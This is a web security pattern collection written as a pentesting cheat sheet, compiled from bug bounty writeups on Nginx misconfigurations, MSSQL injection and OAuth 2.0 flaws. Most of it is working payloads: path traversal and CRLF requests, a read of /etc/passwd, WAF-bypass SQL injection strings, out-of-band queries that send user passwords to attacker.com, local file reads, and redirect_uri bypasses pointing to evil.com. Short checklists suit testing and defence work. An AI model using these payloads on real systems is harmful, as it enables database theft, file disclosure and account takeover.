# Web Security Patterns Collection

Patterns dari curated bug bounty writeups.

---

## 1. Nginx Misconfigurations

Source: https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/

### Missing Root Location

```nginx
server {
    root /etc/nginx;
    
    location /hello.txt {
        try_files $uri $uri/ =404;
        proxy_pass http://127.0.0.1:8080/;
    }
}
```

**Issue:** No `location / {...}` defined. Root directive globally set.

**Exploit:**
```
GET /nginx.conf
```
Returns `/etc/nginx/nginx.conf` contents.

**Common root paths to check:**
- `/etc/nginx`
- `/var/www/html`
- `/usr/share/nginx`

---

### Off-By-Slash (Path Traversal)

```nginx
location /api {
    proxy_pass http://apiserver/v1/;
}
```

**Issue:** Missing trailing slash in `location /api` but `proxy_pass` has trailing slash.

**Exploit:**
```
http://server/api../server-status
→ proxied to http://apiserver/v1/../server-status
→ normalized to http://apiserver/server-status
```

**Detection:**
```
http://server/api/user  →  same response
http://server/apiuser   →  same response?
```
If both return same response, likely vulnerable.

---

### CRLF Injection via $uri

```nginx
location / {
    return 302 https://example.com$uri;
}
```

**Issue:** `$uri` is URL-decoded. Newline chars injected.

**Exploit:**
```
GET /%0d%0aX-Injected:%20header HTTP/1.1

Response:
HTTP/1.1 302 Moved Temporarily
Location: https://example.com/
X-Injected: header
```

**Vuln vars:** `$uri`, `$document_uri` (use `$request_uri` instead)

---

### Unsafe Variable Use (SSI)

**Test:**
```bash
curl -H 'Referer: bar' http://localhost/foo$http_referer | grep 'foobar'
```

If response contains `foobar`, user input treated as Nginx variable.

---

### Raw Backend Response Reading

**Issue:** Invalid HTTP request bypasses `proxy_intercept_errors` and `proxy_hide_header`.

**Exploit:**
```
GET /? XTTP/1.1
Host: 127.0.0.1
```

Response leaks hidden headers and error messages.

---

### merge_slashes Off

```nginx
merge_slashes off;
```

**Issue:** Multiple slashes not normalized. Can enable LFI.

**Exploit:**
```
GET ////etc/passwd
```

---

### Nginx Misconfig Checklist

```
[ ] Check for missing root location
[ ] Test off-by-slash with /path../
[ ] Test CRLF injection in redirects (%0d%0a)
[ ] Check $uri vs $request_uri usage
[ ] Test invalid HTTP request for raw backend response
[ ] Check merge_slashes setting
```

---

## 2. Advanced MSSQL Injection Tricks

Source: https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/

### DNS Out-of-Band (Blind SQLi)

When stacked queries disabled, use these functions for OOB:

**fn_xe_file_target_read_file:**
```
1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users)%2b'.attacker.com\1.xem',null,null))
```
Requires: VIEW SERVER STATE

**fn_get_audit_file:**
```
1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users)%2b'.attacker.com\',default,default)))
```
Requires: CONTROL SERVER

**fn_trace_gettable:**
```
1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users)%2b'.attacker.com\1.trc',default))
```
Requires: CONTROL SERVER

---

### Error-Based WAF Bypass

Instead of `AND 1=@@version`, use type conversion errors:

```
?id=1'%2buser_name(@@version)--
?id=1'%2bdb_name(@@version)--
?id=1'%2bfile_name(@@version)--
?id=1'%2btype_name(@@version)--
?id=1'%2bcol_name(@@version)--
```

Functions: `SUSER_NAME()`, `USER_NAME()`, `PERMISSIONS()`, `DB_NAME()`, `FILE_NAME()`, `TYPE_NAME()`, `COL_NAME()`

---

### Dump Entire Table in One Query

**FOR JSON (shorter):**
```
-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```

**Error-based with JSON:**
```
1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

---

### Read Local Files

**OpenRowset:**
```
-1+union+select+null,(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x)),null,null
```

Requires: ADMINISTER BULK OPERATIONS

---

### Retrieve Current Query

```
-1+union+select+null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

Requires: VIEW SERVER STATE

---

### WAF Bypass Tricks

**Non-standard whitespace:**
```
%C2%85  (Next Line)
%C2%A0  (Non-breaking space)

?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

**Scientific/hex notation:**
```
?id=0eunion+select+null,@@version,null--
?id=0xunion+select+null,@@version,null--
```

**Period instead of space:**
```
?id=1+union+select+null,@@version,null+from.users--
```

**\N separator:**
```
?id=0xunion+select\Nnull,@@version,null+from+users--
```

---

## 3. OAuth 2.0 Exploitation

### State Parameter Issues

**Missing state = CSRF:**
```
1. Attacker starts OAuth flow, captures auth URL before redirect
2. Sends URL to victim
3. Victim clicks → their account linked to attacker's identity
```

**Test:**
- Remove state parameter entirely
- Check if callback accepts without state
- Check if state is session-bound

---

### redirect_uri Bypass

**Techniques:**
```
# Subdomain
https://evil.target.com/callback

# Path traversal  
https://target.com/callback/../evil

# Parameter pollution
https://target.com/callback?redirect=evil.com

# Fragment
https://target.com/callback#@evil.com

# Open redirect chain
https://target.com/callback?next=https://evil.com

# Localhost
http://localhost/callback

# IP address
http://127.0.0.1/callback
```

**Weak validation bypasses:**
```
https://target.com.evil.com
https://evil.com/target.com
https://target.com@evil.com
https://target.com%00.evil.com
```

---

### Token Leakage

**Check:**
- Token in URL fragment (Implicit flow)
- Token in Referer header
- Token in browser history
- Token logged in server logs

**Test:**
1. Complete OAuth callback with token in URL
2. Navigate to external page
3. Check Referer header for token

---

### Scope Escalation

**Attack:**
```
1. Get low-privilege token
2. Modify scope parameter in token request
3. Check if server accepts elevated scope
```

---

### Pre-Account Takeover

**Flow:**
1. Attacker creates account with victim's email (unverified)
2. Victim later registers via OAuth (Google/Facebook)
3. Accounts merge → attacker has access

**Test:**
- Register with email, no verification
- Check if OAuth login links to existing account

---

### CSRF on OAuth Callback

**Missing state exploitation:**
```html
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE">
```

Victim's account linked to attacker's OAuth identity.

---

### Client Secret Leakage

**Check:**
- Mobile app decompilation
- JavaScript source code
- GitHub/public repos
- API responses
- Error messages

---

### OAuth Checklist

```
[ ] State parameter present and validated?
[ ] State bound to session?
[ ] redirect_uri exact match validation?
[ ] PKCE implemented for public clients?
[ ] Token not exposed in URL/Referer?
[ ] Scope validated on token request?
[ ] Email verification before account linking?
[ ] Client secret properly protected?
[ ] Access token short-lived?
[ ] Refresh token revocable?
```

---

## Quick Reference

### Nginx
```bash
# Off-by-slash
curl http://target/api../server-status

# CRLF
curl "http://target/%0d%0aX-Test:%20injected"

# Root path leak
curl http://target/nginx.conf
```

### MSSQL
```sql
-- Error-based WAF bypass
'+user_name(@@version)--

-- DNS OOB
fn_xe_file_target_read_file('C:\*.xel','\\'+data+'.attacker.com\x',null,null)

-- Dump all
for json auto
```

### OAuth
```
# State CSRF
Remove state param, replay callback

# redirect_uri bypass
target.com@evil.com
target.com.evil.com
target.com/../evil
```

---

*Sources: Detectify, PT Swarm, NCC Group, Doyensec*
